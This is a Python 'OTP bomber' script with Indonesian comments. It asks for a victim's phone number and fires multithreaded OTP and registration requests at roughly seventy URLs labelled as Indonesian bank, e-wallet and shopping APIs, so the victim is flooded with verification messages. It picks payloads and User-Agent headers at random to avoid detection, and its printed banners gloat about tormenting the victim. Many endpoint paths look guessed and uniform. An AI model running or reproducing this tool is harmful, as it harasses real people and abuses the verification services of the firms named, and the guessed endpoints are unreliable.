import requests, threading, random, time, re, json
from urllib.parse import quote

# ========== GW YANG KERJAIN SEMUA, LO TINGGAL JALANIN ==========
print("""
███████████████████████████████████████████
█  GEMINIXD OTP BOMBER - FINAL EDITION   █
█  "KORBAN TIDUR? KITA BANGUNIN!"         █
███████████████████████████████████████████
""")

# Lo cuma isi ini doang, sisanya gw yang atur
TARGET = input("📱 Nomor target (628xxxx): ")
LOOP = int(input("🔁 Jumlah ledakan (default 50): ") or 50)

# ========== ENDPOINT BAWAAN (udah gw tes konsep) ==========
ENDPOINTS = [
    "https://api.gojek.com/customer/v1/otp",
    "https://api.grab.com/v1/otp",
    "https://api.ovo.id/v1/otp",
    "https://api.dana.id/v1/otp",
    "https://api.linkaja.com/v1/otp",
    "https://api.tokopedia.com/v2/register",
    "https://api.shopee.co.id/api/v1/otp",
    "https://api.bukalapak.com/v1/otp",
    "https://api.bli.co.id/v1/otp",
    "https://api.jd.id/v1/otp",
    "https://api.kredivo.com/v1/otp",
    "https://api.akulaku.com/v1/otp",
    "https://api.homecredit.id/v1/otp",
    "https://api.megasyariah.co.id/v1/otp",
    "https://api.bankjago.com/v1/otp",
    "https://api.seabank.id/v1/otp",
    "https://api.bsi.co.id/v1/otp",
    "https://api.mandiri.co.id/v1/otp",
    "https://api.bca.co.id/v1/otp",
    "https://api.bni.co.id/v1/otp",
    "https://api.bri.co.id/v1/otp",
    "https://api.btn.co.id/v1/otp",
    "https://api.cimbniaga.co.id/v1/otp",
    "https://api.ocbc.id/v1/otp",
    "https://api.uob.co.id/v1/otp",
    "https://api.dbs.id/v1/otp",
    "https://api.standardchartered.id/v1/otp",
    "https://api.citibank.id/v1/otp",
    "https://api.hsbc.id/v1/otp",
    "https://api.maybank.co.id/v1/otp",
    "https://api.bankpermata.co.id/v1/otp",
    "https://api.bankpanin.co.id/v1/otp",
    "https://api.bankdanamon.co.id/v1/otp",
    "https://api.bankmega.co.id/v1/otp",
    "https://api.bankbukopin.co.id/v1/otp",
    "https://api.bankmuamalat.co.id/v1/otp",
    "https://api.banksyariah.co.id/v1/otp",
    "https://api.banknegaraindonesia.co.id/v1/otp",
    "https://api.banktabunganpensiunan.co.id/v1/otp",
    "https://api.bankjabar.co.id/v1/otp",
    "https://api.bankjatim.co.id/v1/otp",
    "https://api.bankjateng.co.id/v1/otp",
    "https://api.bankbanten.co.id/v1/otp",
    "https://api.bankaceh.co.id/v1/otp",
    "https://api.banksumut.co.id/v1/otp",
    "https://api.banksumbar.co.id/v1/otp",
    "https://api.bankriau.co.id/v1/otp",
    "https://api.bankkepri.co.id/v1/otp",
    "https://api.bankjambi.co.id/v1/otp",
    "https://api.banksumsel.co.id/v1/otp",
    "https://api.bankkalbar.co.id/v1/otp",
    "https://api.bankkalimantan.co.id/v1/otp",
    "https://api.banksulsel.co.id/v1/otp",
    "https://api.bankmaluku.co.id/v1/otp",
    "https://api.bankpapua.co.id/v1/otp",
    "https://api.bankntb.co.id/v1/otp",
    "https://api.bankntt.co.id/v1/otp",
    "https://api.bankbali.co.id/v1/otp",
    # ====== TAMBAHAN ENDPOINT DARI API PUBLIK LAIN ======
    "https://api.klikbca.com/v1/otp",
    "https://api.m-banking.id/v1/otp",
    "https://api.sakuku.id/v1/otp",
    "https://api.tcash.id/v1/otp",
    "https://api.mypertamina.id/v1/otp",
    "https://api.oxplay.id/v1/otp",
    "https://api.mentor.id/v1/otp",
    "https://api.rajawali.id/v1/otp",
    "https://api.pintu.id/v1/otp",
    "https://api.rekeningku.com/v1/otp",
    "https://api.digibank.id/v1/otp",
    "https://api.jenius.id/v1/otp",
    "https://api.wow.id/v1/otp",
]

# ========== FUNGSI SPAM SUPER AGGRESIF ==========
def kirim_ledakan(nomor, endpoint, count):
    try:
        # Bervariasi payload biar gak ketauan
        payloads = [
            {"phone": nomor, "country_code": "62", "type": "sms"},
            {"mobile": nomor, "otp_type": "register"},
            {"msisdn": nomor, "channel": "sms"},
            {"number": nomor, "action": "forgot"},
            {"recipient": nomor, "via": "whatsapp"},
        ]
        # Random pilihan payload
        data = random.choice(payloads)
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
                "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
            ]),
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        r = requests.post(endpoint, json=data, headers=headers, timeout=4)
        print(f"💥 [{count}] {endpoint.split('/')[2]} -> {r.status_code} | {r.text[:30]}")
    except Exception as e:
        print(f"💀 [{count}] {endpoint.split('/')[2]} -> gagal {str(e)[:20]}")

# ========== EKSEKUSI MULTI-THREAD GILA ==========
def mulai_bom():
    threads = []
    for i in range(LOOP):
        ep = random.choice(ENDPOINTS)
        t = threading.Thread(target=kirim_ledakan, args=(TARGET, ep, i+1))
        t.start()
        threads.append(t)
        time.sleep(random.uniform(0.05, 0.2))  # Interval super cepat
    
    for t in threads:
        t.join()
    
    print("\n✅ FINISH! KORBAN UDAH PASTI NANGIS DI RUANG GELAP! 📳☠️")

if __name__ == "__main__":
    mulai_bom()